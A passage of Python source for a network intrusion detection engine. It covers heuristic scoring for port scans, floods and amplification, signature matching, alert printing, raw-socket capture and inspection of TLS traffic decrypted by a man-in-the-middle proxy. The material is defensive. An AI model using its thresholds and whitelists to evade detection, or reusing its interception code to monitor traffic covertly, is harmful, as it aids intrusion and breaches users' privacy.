          volume_bonus = how many ports over threshold  (up to +0.10)
          speed_bonus  = ports per second               (up to +0.05)
          spread_bonus = hitting multiple hosts         (up to +0.02)
        """
        base         = 0.82
        over         = unique_port_count - threshold
        volume_bonus = min(0.10, over * 0.01)
        pps          = unique_port_count / max(elapsed_secs, 0.1)
        speed_bonus  = min(0.05, pps * 0.005)
        spread_bonus = min(0.02, (dst_count - 1) * 0.01) if dst_count > 1 else 0
        return min(0.99, base + volume_bonus + speed_bonus + spread_bonus)

    @staticmethod
    def high_risk_port(port: int, flow: Flow) -> float:
        """
        High-risk service port accessed with volume.
        Base: 0.60 — single packet to RDP/SMB could be legitimate.
        Boosters:
          +0.10  port is SMB (445) or RPC (135) — most exploited
          +0.08  10+ packets — sustained session
          +0.07  SYN retransmits (syn_count > 1 means target didn't respond)
          +0.05  50+ packets — clearly active
          +0.04  high byte rate
        """
        EXPLOIT_TIER = {445, 135, 139, 3389}
        base = 0.60
        evidence = [
            (0.10, port in EXPLOIT_TIER),
            (0.08, flow.pkt_count >= 10),
            (0.07, flow.syn_count > 1),
            (0.05, flow.pkt_count >= 50),
            (0.04, flow.pps() > 10),
        ]
        return min(0.99, base + sum(w for w, v in evidence if v))

    @staticmethod
    def icmp_flood(pps: float, pkt_count: int) -> float:
        """
        ICMP flood — confidence scales with packet rate and volume.
        At 50pps/200pkts: ~0.85.  At 200pps/1000pkts: ~0.97.
        """
        base        = 0.80
        rate_bonus  = min(0.10, pps / 500)
        volume_bonus= min(0.09, pkt_count / 5000)
        return min(0.99, base + rate_bonus + volume_bonus)

    @staticmethod
    def udp_amplification(byte_count: int, pkt_count: int) -> float:
        """
        UDP amplification — large bytes, very few packets = high amplification ratio.
        Amplification ratio = bytes / packets.
        Ratio 3000 (3KB/pkt):  ~0.70
        Ratio 10000 (10KB/pkt): ~0.85
        Ratio 30000 (30KB/pkt): ~0.95
        """
        ratio       = byte_count / max(pkt_count, 1)
        base        = 0.55
        ratio_bonus = min(0.44, ratio / 100000)
        return min(0.99, base + ratio_bonus)


# ══════════════════════════════════════════════════════════════════════════════
#  HEURISTIC ENGINE  (fires INDEPENDENTLY – no ML required)
# ══════════════════════════════════════════════════════════════════════════════
class HeuristicEngine:
    def __init__(self):
        # port-scan tracking:  src_ip → deque of (dst_ip, port, timestamp)
        self._scan_tracker: Dict[str, deque] = defaultdict(lambda: deque(maxlen=500))
        # syn-flood tracking:  src_ip → deque of timestamps
        self._syn_tracker:  Dict[str, deque] = defaultdict(lambda: deque(maxlen=2000))
        # scan alert dedup:  src_ip → last alert timestamp
        self._scan_alerted: Dict[str, float] = {}
        self._cc = ConfidenceCalculator()
        
        # Pre-compile regex signatures for speed
        import re
        self._compiled_sigs = []
        for sig, (name, web_safe) in PAYLOAD_SIGS.items():
            if sig.startswith(b"REGEX:"):
                pattern = sig[6:].decode("utf-8", "ignore")
                try:
                    # Use DOTALL and MULTILINE for better matching of obfuscated payloads
                    self._compiled_sigs.append((re.compile(pattern, re.IGNORECASE | re.DOTALL | re.MULTILINE), name, web_safe))
                except Exception: pass
            else:
                self._compiled_sigs.append((sig.lower(), name, web_safe))

    @staticmethod
    def _entropy_bytes(data: bytes) -> float:
        """Shannon entropy of bytes; 0..8 for typical payloads."""
        if not data:
            return 0.0
        import math
        from collections import Counter
        counts = Counter(data)
        n = len(data)
        probs = [c / n for c in counts.values()]
        return -sum(p * math.log2(p) for p in probs)

    def check(self, pkt, flow: Flow) -> Optional[Tuple[str, str, float, str]]:
        """
        Returns (attack_type, rule, confidence, severity)  OR  None.
        Confidence is computed from real evidence — never hardcoded.
        Checks ordered most severe → least severe.
        """
        k = flow.key
        # Get payload safely, handling potential nesting or missing Raw/Padding layers
        from scapy.all import Raw, Padding
        payload_bytes = b""
        if pkt.haslayer(Raw):
            payload_bytes = bytes(pkt[Raw].load)
        elif pkt.haslayer(Padding):
            payload_bytes = bytes(pkt[Padding].load)
        elif hasattr(pkt, "load"):
            payload_bytes = bytes(pkt.load)
        elif hasattr(pkt, "payload"):
            # Deep dive into nested layers to find anything that looks like a payload
            curr = pkt.payload
            while curr:
                if hasattr(curr, "load"):
                    payload_bytes = bytes(curr.load)
                    break
                if not hasattr(curr, "payload"): break
                curr = curr.payload
        
        if not payload_bytes:
            # If no explicit payload, check if it's a suspicious port probe
            if k.dst_port in SUSPICIOUS_PORTS:
                # Use ConfidenceCalculator to avoid hardcoded 0.85
                conf = self._cc.suspicious_port(k.dst_port, flow, has_payload=False)
                return (f"Suspicious Port Probe", f"PORT:{k.dst_port}", conf, "HIGH")
            
        payload_lower = payload_bytes.lower()
        payload_str   = payload_bytes.decode("utf-8", "ignore")
        payload_str_l = payload_str.lower()

        # Debug log for suspicious loopback payloads (visible in ids_engine.log)
        if k.src_ip == "127.0.0.1" and len(payload_bytes) > 4:
            log.info(f"[\033[94mDEBUG\033[0m] Loopback Payload ({k.src_port}->{k.dst_port}): {payload_str[:60]!r}")

        has_payload = len(payload_bytes) > 0
        port_suspicious = k.dst_port in SUSPICIOUS_PORTS or k.src_port in SUSPICIOUS_PORTS

        # ── 1. Payload signatures ─────────────────────────────────────────────
        is_web_response = k.src_port in WEB_SERVER_PORTS

        for sig_obj, name, web_safe in self._compiled_sigs:
            match = False
            if hasattr(sig_obj, "search"):  # Compiled Regex
                if sig_obj.search(payload_str):
                    match = True
            elif sig_obj in payload_lower:
                match = True
                
            if not match:
                continue
                
            # Skip web-safe sigs on normal HTTP responses (e.g. <script in HTML)
            if web_safe and is_web_response:
                log.debug(f"[FP-SUPPRESS] Skipped {name!r} on web response "
                          f"{k.src_ip}:{k.src_port} (normal HTML)")
                continue
            conf = self._cc.payload_sig(sig_obj if isinstance(sig_obj, bytes) else b"", name, flow, port_suspicious)
            return (name, f"SIG:{name}", conf, "CRITICAL")

        # ── 2. Suspicious port ────────────────────────────────────────────────
        for port in (k.dst_port, k.src_port):
            if port in SUSPICIOUS_PORTS:
                conf = self._cc.suspicious_port(port, flow, has_payload)
                return (
                    f"Suspicious Port {port} – {SUSPICIOUS_PORTS[port]}",
                    f"SUSPICIOUS_PORT:{port}",
                    conf,
                    "HIGH",
                )

        # ── 3. SYN Flood ──────────────────────────────────────────────────────
        if pkt.haslayer(TCP) and pkt[TCP].flags & 0x02:
            now = time.time()
            dq  = self._syn_tracker[k.src_ip]
            dq.append(now)
            rate = sum(1 for t in dq if now - t < 1.0)
            if rate >= CFG["syn_flood_rate"]:
                conf = self._cc.syn_flood(rate, CFG["syn_flood_rate"])
                return ("SYN Flood", f"SYN_FLOOD:{rate}/s", conf, "CRITICAL")

        # ── 4. Port scan ──────────────────────────────────────────────────────
        now = time.time()

        # DIRECTION GUARD — skip tracking when this is clearly a server response:
        #
        #   src_port < 1024:  well-known service port on the SOURCE side means
        #                     the source IS a server (e.g. 443→client).
        #                     A server opening connections to many client ephemeral
        #                     ports is normal multiplexing, not a scan.
        #
        #   dst_port > 10000: scanning ephemeral ports (49152-65535) makes no
        #                     sense for an attacker — real scans target service
        #                     ports (22, 80, 443, 3389 …).  High dst_port means
        #                     we are watching a client's return-traffic.
        #
        #   src_port in WEB_SERVER_PORTS: CDN/web server responding to browser tabs.
        #
        # Real scan: high-src-port attacker → low sequential dst ports
        # Skip when dst is a normal browsing target (you connecting to HTTPS)
        is_server_response = (
            k.src_port < 1024
            or k.src_port in WEB_SERVER_PORTS
            or k.src_port in ENCRYPTED_PORTS
            or k.dst_port > 10000
            or k.dst_port in ENCRYPTED_PORTS
            or k.dst_port in WEB_SERVER_PORTS
        )

        if not is_server_response:
            dq = self._scan_tracker[k.src_ip]
            dq.append((k.dst_ip, k.dst_port, now))

            recent       = [(d, p, t) for d, p, t in dq if now - t < 10.0]
            unique_ports = {(d, p) for d, p, t in recent}
            unique_dsts  = {d      for d, p, t in recent}
            n            = len(unique_ports)

            if n >= CFG["scan_threshold"]:
                last_alert = self._scan_alerted.get(k.src_ip, 0)
                if now - last_alert >= 30.0:
                    self._scan_alerted[k.src_ip] = now
                    elapsed = now - min(t for _, _, t in recent)
                    conf    = self._cc.port_scan(n, CFG["scan_threshold"],
                                                 elapsed, len(unique_dsts))
                    return (
                        "Port Scan",
                        f"PORT_SCAN:{n}_ports/{elapsed:.1f}s",
                        conf,
                        "HIGH",
                    )

        # ── 5. High-risk port ─────────────────────────────────────────────────
        for port in (k.dst_port, k.src_port):
            if port in HIGH_RISK_PORTS and flow.pkt_count >= 5:
                conf = self._cc.high_risk_port(port, flow)
                return (
                    f"High-Risk Port {port} – {HIGH_RISK_PORTS[port]}",
                    f"HIGH_RISK_PORT:{port}",
                    conf,
                    "MEDIUM",
                )

        # ── 6. ICMP flood ─────────────────────────────────────────────────────
        if pkt.haslayer(ICMP) and flow.pkt_count > 200 and flow.pps() > 50:
            if k.src_ip == k.dst_ip:
                return None  # Ignore self-traffic SMURF false positive
            conf = self._cc.icmp_flood(flow.pps(), flow.pkt_count)
            return ("ICMP Flood", f"ICMP_FLOOD:{flow.pps():.0f}pps", conf, "HIGH")

        # ── 7. UDP amplification ──────────────────────────────────────────────
        if pkt.haslayer(UDP) and flow.byte_count > 65000 and flow.pkt_count < 20:
            # Skip if either endpoint is a known encrypted/VPN port —
            # those packets are large AND high-entropy by design.
            if k.src_port not in ENCRYPTED_PORTS and k.dst_port not in ENCRYPTED_PORTS:
                conf = self._cc.udp_amplification(flow.byte_count, flow.pkt_count)
                return ("UDP Amplification", "UDP_AMPLIFICATION", conf, "MEDIUM")

        # ── 8. High-Entropy UDP Anomaly (wired simulator / unknown protocols) ─
        # Designed to catch "weird attacks" that evade literal signatures:
        # - random high-entropy payload on an uncommon high UDP port
        # - not on known encrypted/VPN ports (to avoid TLS/VPN false positives)
        if pkt.haslayer(UDP) and has_payload:
            if not self.is_encrypted_port(k.src_port, k.dst_port):
                # Use the actual packet payload (not truncated flow buffer) for this check
                raw_bytes = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else b""
                if raw_bytes:
                    ent = self._entropy_bytes(raw_bytes[:2048])
                    uncommon_high_port = (k.dst_port > 10000 and k.src_port > 10000)
                    big_payload = len(raw_bytes) >= 800
                    if uncommon_high_port and big_payload and ent >= 7.2:
                        # Confidence scales with entropy + size (capped).
                        size_bonus = min(0.15, (len(raw_bytes) - 800) / 8000)
                        ent_bonus = min(0.15, (ent - 7.2) / 1.0 * 0.15)
                        conf = min(0.92, 0.62 + size_bonus + ent_bonus)
                        return ("High-Entropy UDP Anomaly", "UDP_ENTROPY_ANOMALY", conf, "MEDIUM")

        # ── 8. Entropy anomaly guard ──────────────────────────────────────────
        # If any sub-engine adds an entropy-based check, it must call
        # this helper first.  Returning True means: skip entropy check.
        # Example: TLS on port 443 → entropy ~7.9 → always skip.

        return None

    @staticmethod
    def is_encrypted_port(src_port: int, dst_port: int) -> bool:
        """
        Returns True when either endpoint is a known encrypted-traffic port.
        Use this to guard ANY entropy-based heuristic to prevent false positives
        on TLS, SSH, VPN, and other legitimately high-entropy protocols.

        Usage in a heuristic:
            if HeuristicEngine.is_encrypted_port(k.src_port, k.dst_port):
                return None   # skip — high entropy is expected here
        """
        return src_port in ENCRYPTED_PORTS or dst_port in ENCRYPTED_PORTS


# ══════════════════════════════════════════════════════════════════════════════
#  ALERT MANAGER
# ══════════════════════════════════════════════════════════════════════════════
class AlertManager:
    SEVERITY_COLORS = {
        "CRITICAL": "\033[91m",   # bright red
        "HIGH"    : "\033[33m",   # yellow
        "MEDIUM"  : "\033[36m",   # cyan
        "LOW"     : "\033[37m",   # grey
    }
    RESET = "\033[0m"

    def __init__(self, log_path: str):
        self.log_path     = log_path
        self._lock        = threading.Lock()
        self.total        = 0
        self.total_blocked = 0
        self._by_type: Dict[str, int] = defaultdict(int)
        self._by_severity: Dict[str, int] = defaultdict(int)

    def fire(self, alert: Alert):
        self.total += 1
        self._by_type[alert.attack_type] += 1
        self._by_severity[alert.severity] += 1
        if alert.blocked:
            self.total_blocked += 1

        col   = self.SEVERITY_COLORS.get(alert.severity, "")
        reset = self.RESET

        # ── Compact view for LOW severity (prevents console flooding) ────────
        if alert.severity == "LOW":
            ts_short = alert.timestamp[11:19]
            print(f"{col}[LOW]{reset} {ts_short} | {alert.attack_type:<8} | "
                  f"{alert.src_ip}:{alert.src_port} -> {alert.dst_ip}:{alert.dst_port} "
                  f"({alert.confidence*100:.1f}%)")
            # Log to file but skip the rest of the visual block
            with self._lock:
                with open(self.log_path, "a", encoding="utf-8") as f:
                    f.write(json.dumps(asdict(alert), ensure_ascii=False) + "\n")
            return

        print(f"\n{col}{'-'*70}{reset}")
        print(f"{col}  ALERT #{self.total}  [{alert.severity}]  {alert.attack_type}{reset}")
        print(f"  Time      : {alert.timestamp}")
        print(f"  Flow      : {alert.src_ip}:{alert.src_port}  ->  {alert.dst_ip}:{alert.dst_port}  [{alert.proto}]")
        print(f"  Rule      : {alert.rule}")
        details = []
        if alert.ml_confidence > 0: details.append(f"ML: {alert.ml_confidence*100:.0f}%")
        if alert.heuristic_confidence > 0: details.append(f"Heur: {alert.heuristic_confidence*100:.0f}%")
        if alert.genai_confidence > 0: details.append(f"GenAI: {alert.genai_confidence*100:.0f}%")
        details_str = f" ({' | '.join(details)})" if details else ""
        print(f"  Confidence: {alert.confidence*100:.1f}%{details_str}")
        print(f"  Packets   : {alert.pkt_count}  |  Bytes: {alert.byte_count}")
        # Response tier + action taken
        tier_icons = {"AUTO_BLOCK": "BLOCK", "ISOLATE": "ISOLATE",
                      "RATE_LIMIT": "RATE-LIMIT", "LOG": "LOG-ONLY"}
        tier_label = tier_icons.get(alert.response_tier, alert.response_tier)
        print(f"  Response  : {tier_label}")
        # MITRE ATT&CK
        if alert.mitre_tactic:
            print(f"  MITRE     : {alert.mitre_tactic}")
            if alert.mitre_technique:
                print(f"  Technique : {alert.mitre_technique}")
        
        # SHAP / Explanation
        if alert.shap_explanation:
            lines = alert.shap_explanation.strip().split('\n')
            print(f"  Explain   : {lines[0]}")
            for extra_line in lines[1:2]:
                print(f"              {extra_line}")
        # LLM summary
        if alert.llm_summary:
            summary_display = alert.llm_summary[:300]
            if len(alert.llm_summary) > 300:
                summary_display += "..."
            print(f"  LLM       : {summary_display}")
        # Block status
        if alert.blocked:
            print(f"  {col}SOURCE IP BLOCKED{reset}")
        print(f"{col}{'-'*70}{reset}\n")
        sys.stdout.flush()

        # Write to JSONL
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(json.dumps(asdict(alert), ensure_ascii=False) + "\n")

# ══════════════════════════════════════════════════════════════════════════════
#  RAW SOCKET MONITOR  (catches local→local traffic Scapy misses on Windows)
# ══════════════════════════════════════════════════════════════════════════════
class RawSocketMonitor(threading.Thread):
    """
    On Windows, Scapy on the Wi-Fi adapter cannot see packets where
    src == dst == your own IP (Windows fast-paths them).
    This thread opens a raw socket to catch them.
    """
    def __init__(self, callback):
        super().__init__(daemon=True, name="RawSockMon")
        self.callback  = callback
        self._stop_evt = threading.Event()

    def run(self):
        if not IS_WINDOWS:
            return   # Linux Scapy handles this fine
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            s.bind((socket.gethostbyname(socket.gethostname()), 0))
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            if IS_WINDOWS:
                s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            s.settimeout(1.0)
            log.info("RawSocketMonitor  →  listening for local traffic")
            while not self._stop_evt.is_set():
                try:
                    data, addr = s.recvfrom(65535)
                    self.callback(data)
                except socket.timeout:
                    pass
            if IS_WINDOWS:
                s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            s.close()
        except PermissionError:
            log.warning("RawSocketMonitor: needs admin rights – local traffic may be missed")
        except Exception as e:
            log.debug(f"RawSocketMonitor error: {e}")

    def stop(self):
        self._stop_evt.set()


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN IDS ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class IDSEngine:
    def __init__(self):
        log.info("Initializing IDS Engine ...")

        self.fw        = FirewallManager()
        self.llm       = LLMAnalyzer()
        self.ml        = MLEngine(CFG["model_path"])
        self.heuristic = HeuristicEngine()
        self.alerts    = AlertManager(CFG["alert_log"])

        self.flows     : Dict[FlowKey, Flow] = {}
        self._flow_lock = threading.Lock()

        self.total_pkts = 0
        self._stop_evt  = threading.Event()
        self._raw_mon   = RawSocketMonitor(self._handle_raw_bytes)

        # ── Adaptive subsystems ──────────────────────────────────────────────
        # Drift monitor
        self.drift_mon = None
        if DRIFT_OK:
            self.drift_mon = DriftMonitor(
                reference_path=os.path.join(CFG["model_path"], "reference_dist.pkl")
            )

        # SHAP explainer (only if ML model is loaded)
        self.explainer = None
        if SHAP_OK and self.ml.available and self.ml.predictor:
            try:
                meta = self.ml.predictor.meta
                self.explainer = create_explainer(
                    self.ml.predictor.model, meta.get("feature_cols", [])
                )
            except Exception as e:
                log.warning(f"SHAP init skipped: {e}")

        # Feedback collector
        self.feedback = None
        if FEEDBACK_OK:
            self.feedback = FeedbackCollector()

        # Adaptive FP suppression policy (instant effect; no retrain needed)
        self.policy = None
        if POLICY_OK:
            try:
                self.policy = AdaptivePolicy(
                    feedback_csv="data/online_learning.csv",
                    min_fp=int(CFG.get("fp_suppress_min_count", 3)),
                )
            except Exception:
                self.policy = None

        # Standalone LLM (for Sigma/Suricata rule gen and MITRE mapping)
        self.llm_standalone = None
        if STANDALONE_LLM_OK:
            try:
                self.llm_standalone = StandaloneLLM()
            except Exception:
                pass

        # Secure sniffer (auto-deploy)
        self.sniffer = None
        self.flow_ingester = None
        if SNIFFER_OK:
            self.sniffer = SecureSniffer(auto_proxy=False)
            self.flow_ingester = DecryptedFlowIngester(
                callback=self._handle_decrypted_flow
            )

        # Adaptive scheduler (background retraining)
        self.scheduler = None
        if FEEDBACK_OK and self.feedback:
            self.scheduler = AdaptiveScheduler(
                drift_monitor=self.drift_mon,
                feedback_collector=self.feedback,
            )

        # Last alert reference for keyboard feedback
        self._last_alert_flow = None
        self._last_alert_label = ""
        self._last_alert_rule = ""
        # Last ML context (for enriching alerts + feedback rows)
        self._last_ml_margin: float = 0.0
        # Alert deduplication for ML layer: (src_ip, label, dst_port) -> last_alert_time
        self._ml_alerted: Dict[tuple, float] = {}

        # Manual response control plane (dashboard -> engine)
        self._manual_actions_path = os.path.join("data", "manual_actions.jsonl")
        self._manual_actions_offset = 0
        self._manual_actions_stop = threading.Event()
        self._manual_actions_thread = None

        # derive mode string
        if self.ml.available:
            self.mode = "supervised+heuristic+adaptive"
        else:
            self.mode = "heuristic-only"

    def _handle_decrypted_flow(self, flow_data: dict):
        """Callback for decrypted flows from the MITM sniffer."""
        try:
            # Reconstruct basic flow keys
            src_ip = flow_data.get("src_ip", "0.0.0.0")
            dst_ip = flow_data.get("dst_ip", "0.0.0.0")
            src_port = int(flow_data.get("src_port", 0))
            dst_port = int(flow_data.get("dst_port", 0))
            payload_snippet = flow_data.get("payload_snippet", "").encode("utf-8")
            
            # Trusted domains whitelist (Bypass inspection to avoid FPs on normal web traffic)
            trusted_domains = {"apple.com", "google.com", "googleapis.com", "cloudflare.com", 
                               "microsoft.com", "windowsupdate.com", "mozilla.com", "icloud.com",
                               "amazon.com", "azure.com", "github.com", "gitlab.com"}
            host = str(flow_data.get("host", "")).lower()
            if any(host.endswith(d) for d in trusted_domains):
                return

            fkey = FlowKey(src_ip=src_ip, dst_ip=dst_ip, src_port=src_port, dst_port=dst_port, proto="TCP")
            synthetic_flow = Flow(key=fkey)
            synthetic_flow.pkt_count = int(flow_data.get("bidirectional_packets", 1))
            synthetic_flow.byte_count = int(flow_data.get("bidirectional_bytes", 0))
            synthetic_flow.start_time = time.time() - 0.1
            synthetic_flow.last_seen = time.time()
            synthetic_flow.payloads = [payload_snippet] if payload_snippet else []
            
            # Construct a synthetic Scapy packet so the HeuristicEngine can process it
            from scapy.all import IP, TCP, Raw
            pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port)
            if payload_snippet:
                pkt = pkt / Raw(load=payload_snippet)

            # 1. Run the Heuristic Engine directly on the decrypted payload
            # This detects actual attacks like SQLi/XSS hidden inside TLS!
            result = self.heuristic.check(pkt, synthetic_flow)
            
            if result:
                attack_type, rule, conf, severity = result
                attack_type = f"TLS-MITM {attack_type}"
                rule = f"MITM:{rule}"
                synthetic_flow.alerted = True

                log.warning(f"[\033[91mMITM-INTERCEPT\033[0m] Deep-packet inspection triggered for: {host} -> {attack_type} (Severity: {severity})")

                # Trigger full alert, block, and UI sync
                self._raise_alert(
                    flow=synthetic_flow,
                    attack_type=attack_type,
                    rule=rule,
                    confidence=conf,
                    severity=severity
                )

        except Exception as e:
            log.debug(f"MITM Alert processing error: {e}")

    # ── Interface selection ───────────────────────────────────────────────────
    def _pick_interfaces(self) -> list:
        """Return list of interface names to sniff on."""
        ifaces = get_if_list()
        log.info(f"Available interfaces: {ifaces}")

        if IS_WINDOWS:
            # On Windows, DO NOT exclude loopback.
            # Many lab/simulator tests send to 127.0.0.1 which is only visible on loopback/Npcap adapter.
            # Sniffing on all interfaces is the most reliable default.
            selected = list(ifaces)
        else:
            selected = ifaces

        log.info(f"Sniffing on: {selected}")
        return selected

    # ── Packet entry points ──────────────────────────────────────────────────
    def _handle_raw_bytes(self, data: bytes):
        """Called by RawSocketMonitor for local-to-local traffic."""
        try:
            from scapy.all import IP as ScapyIP, Ether
            pkt = ScapyIP(data)
            if not pkt.haslayer(ScapyIP):
                pkt = Ether(data)
            self._process_pkt(pkt)
        except Exception:
            pass

    def _handle_pkt(self, pkt):
        self._process_pkt(pkt)

    def _process_pkt(self, pkt):
        """Core packet processing: flow update → heuristics → ML → alert."""
        self.total_pkts += 1

        if not pkt.haslayer(IP):
            return

        ip  = pkt[IP]
        src = ip.src
        dst = ip.dst

        # Determine proto + ports
        if pkt.haslayer(TCP):
            proto    = "TCP"
            src_port = pkt[TCP].sport
            dst_port = pkt[TCP].dport
        elif pkt.haslayer(UDP):
            proto    = "UDP"
            src_port = pkt[UDP].sport
            dst_port = pkt[UDP].dport
        elif pkt.haslayer(ICMP):
            proto    = "ICMP"
            src_port = 0
            dst_port = pkt[ICMP].type
        else:
            return

        # ── Self-Traffic Filter ──────────────────────────────────────────────
        # Suppress alerts where source and destination are the same machine.
        if src == dst:
            return

        # ── Quick debug for watched ports ────────────────────────────────────
        watched = set(SUSPICIOUS_PORTS) | {4444, 8080}
        if dst_port in watched or src_port in watched:
            log.debug(f"[PKT-DEBUG] {src}:{src_port} → {dst}:{dst_port} [{proto}]  "
                     f"pkt#{self.total_pkts}")

        # ── Flow lookup / creation ────────────────────────────────────────────
        fkey = FlowKey(src, dst, src_port, dst_port, proto)
        with self._flow_lock:
            if fkey not in self.flows:
                self.flows[fkey] = Flow(key=fkey)
                log.debug(f"[DEBUG] New flow: {src}:{src_port} → {dst}:{dst_port} [{proto}]")

            flow = self.flows[fkey]
            flow.pkt_count  += 1
            flow.byte_count += len(pkt)
            flow.last_seen   = time.time()

            if pkt.haslayer(TCP):
                flags = pkt[TCP].flags
                if flags & 0x02: flow.syn_count += 1
                if flags & 0x01: flow.fin_count += 1
                if flags & 0x04: flow.rst_count += 1
                if flags & 0x10: flow.ack_count += 1

            if pkt.haslayer(Raw):
                raw = bytes(pkt[Raw].load)
                if len(flow.payloads) < 5:
                    flow.payloads.append(raw[:200])

        # ── HEURISTIC CHECK (always, independently) ───────────────────────────
        result = self.heuristic.check(pkt, flow)

        # ── LOOPBACK SILENCE FILTER ──────────────────────────────────────────
        # If no heuristic match, and it's loopback traffic (127.0.0.1),
        # we SILENTLY IGNORE it to allow dev tools (mitmproxy, etc) to work.
        # EXCEPTION: If it's port 80 (Simulator target), we allow ML to proceed.
        if result is None and src == "127.0.0.1" and dst == "127.0.0.1":
            if dst_port != 80:
                return

        # ── TWO-STAGE ML PIPELINE ─────────────────────────────────────────────
        # Stage 1: XGBoost fast triage
        if result is None and self.ml.available:
            label, conf, probs, margin = self.ml.predict(flow)
            label_up = str(label).upper()
            # store margin for alert enrichment if an ML alert fires
            try:
                self._last_ml_margin = float(margin or 0.0)
            except Exception:
                self._last_ml_margin = 0.0

            # Per-class threshold gate (reduces false positives from noisy classes)
            cls_thr = float(CFG.get("class_thresholds", {}).get(label_up, CFG.get("class_thresholds", {}).get("*", 0.70)))

            if label not in ("BENIGN", "UNKNOWN", "NORMAL") and conf >= CFG["llm_threshold"] and conf >= cls_thr:
                # Instant false-positive suppression based on repeated analyst feedback.
                if self.policy:
                    suppress, reason = self.policy.should_suppress(
                        proto=proto, dst_port=dst_port, original_label=label, model_conf=conf
                    )
                    if suppress:
                        log.info(f"[ADAPTIVE] Suppressed ML alert: {reason} conf={conf:.2f}")
                        return
                # Stage 2: Context-aware severity (NOT just confidence-based)
                severity = self._classify_severity(
                    label, conf, dst_port, src_port, proto,
                    flow.pkt_count, flow.byte_count, flow.duration(),
                    src_ip=src, dst_ip=dst, flow=flow, entropy=float(flow.last_entropy or 0.0)
                )
                # Uncertainty gating: low margin => downgrade to LOW/LOG to avoid FPs.
                min_margin = float(CFG.get("min_proba_margin", 0.12))
                if margin and margin < min_margin:
                    log.info(f"[ADAPTIVE] Uncertainty gate: label={label_up} conf={conf:.2f} margin={margin:.3f} -> LOW/LOG")
                    severity = "LOW"
                if severity == "IGNORE":
                    result = None
                elif severity == "CRITICAL":
                    result = (label, f"ML:{label}@{conf:.2f}[m={margin:.3f}]", conf, "CRITICAL")
                elif severity == "HIGH":
                    result = (label, f"ML:{label}@{conf:.2f}[m={margin:.3f}][ADAPTIVE]", conf, "HIGH")
                elif severity == "MEDIUM":
                    result = (label, f"ML:{label}@{conf:.2f}[m={margin:.3f}]", conf, "MEDIUM")
                else:
                    result = (label, f"ML:{label}@{conf:.2f}[m={margin:.3f}]", conf, "LOW")

        # ── Feed drift monitor (STABLE TRAFFIC ONLY) ──────────────────────────
        # We only update the drift monitor if NO attack was detected.
        # This prevents the model from retraining on its own attack traffic.
        if result is None and self.drift_mon:
            proto_num = 6 if proto == "TCP" else 17 if proto == "UDP" else 1
            self.drift_mon.update({
                "bidirectional_bytes": flow.byte_count,
                "bidirectional_packets": flow.pkt_count,
                "bidirectional_duration_ms": flow.duration() * 1000,
                "dst_port": dst_port,
                "src_port": src_port,
                "bytes_per_packet": flow.byte_count / max(flow.pkt_count, 1),
                "packets_per_sec": flow.pps(),
                "bytes_per_sec": flow.byte_count / max(flow.duration(), 0.001),
                "flow_density": flow.byte_count / (flow.duration() * 1000 + 1),
                "packet_to_byte_ratio": flow.pkt_count / max(flow.byte_count, 1),
            })

        if result and not flow.alerted:
            attack_type, rule, confidence, severity = result
            
            # Cross-flow deduplication for ML layer (30s window)
            # Prevents alert storms when multiple source ports are used in one attack.
            now = time.time()
            dedup_key = (src, attack_type, dst_port)
            last_alert = self._ml_alerted.get(dedup_key, 0)
            if now - last_alert < 30.0:
                return # Deduplicated
                
            self._ml_alerted[dedup_key] = now
            flow.alerted = True
            
            # --- HYBRID CONFIDENCE RESOLVER ---
            h_conf = 0.0
            m_conf = 0.0
            
            is_heuristic = not rule.startswith("ML:")
            if is_heuristic:
                h_conf = confidence
                # Run ML to see if it agrees
                if self.ml.available:
                    ml_label, ml_conf, _, _ = self.ml.predict(flow)
                    if ml_label not in ("BENIGN", "UNKNOWN", "NORMAL"):
                        m_conf = ml_conf
            else:
                m_conf = confidence
                # Heuristic was None, so h_conf = 0.0
                
            # Query Gen AI / LLM synchronously for alert confirmation
            g_conf = 0.0
            g_verdict = "NORMAL"
            if self.llm_standalone:
                try:
                    proto_num = 6 if proto == "TCP" else 17 if proto == "UDP" else 1
                    flow_dict = {
                        "src_ip": src, "dst_ip": dst,
                        "src_port": int(src_port), "dst_port": int(dst_port),
                        "protocol": proto_num,
                        "bidirectional_packets": flow.pkt_count,
                        "bidirectional_bytes": flow.byte_count,
                        "bidirectional_duration_ms": flow.duration() * 1000,
                        "payload_entropy": float(flow.last_entropy or 0.0),
                        "payload_len_var": float(self.ml._calculate_payload_var(flow.payloads) if self.ml else 0.0),
                        "is_high_volume": int(flow.byte_count > 1_000_000),
                    }
                    metadata = {
                        "suspected_attack_type": attack_type,
                        "trigger_rule": rule,
                        "ml_confidence": float(m_conf),
                        "heuristic_confidence": float(h_conf),
                        "severity": severity,
                    }
                    llm_res = self.llm_standalone.analyze_flow(flow_dict, metadata)
                    g_verdict = str(llm_res.get("verdict", "NORMAL")).upper()
                    g_conf = float(llm_res.get("confidence", 0.0))
                except Exception as e:
                    log.warning(f"Gen AI flow analysis failed: {e}")

            # Calculate hybrid resolved confidence
            base_conf = max(h_conf, m_conf)
            agreement_bonus = 0.0
            if h_conf > 0.0 and m_conf > 0.0:
                agreement_bonus = 0.05
                
            resolved_conf = base_conf + agreement_bonus
            
            # Gen AI Boost
            if g_verdict in ("MALICIOUS", "ATTACK"):
                resolved_conf = resolved_conf + (1.0 - resolved_conf) * 0.4 * g_conf
            elif g_verdict == "NORMAL" and g_conf > 0.0:
                # If Gen AI thinks it is normal, apply discount
                resolved_conf = resolved_conf * (1.0 - 0.3 * g_conf)
                
            resolved_conf = min(0.99, max(0.01, resolved_conf))
            
            # Print resolution details to log
            log.info(f"[RESOLVER] Alert resolved: Heuristic={h_conf:.2f} | ML={m_conf:.2f} | GenAI={g_conf:.2f} ({g_verdict}) -> Resolved Conf={resolved_conf:.2f}")

            self._raise_alert(flow, attack_type, rule, resolved_conf, severity, h_conf, m_conf, g_conf)

    # ── Context-Aware Severity Classification ─────────────────────────────────
    def _classify_severity(
        self, label: str, conf: float, dst_port: int, src_port: int, proto: str,
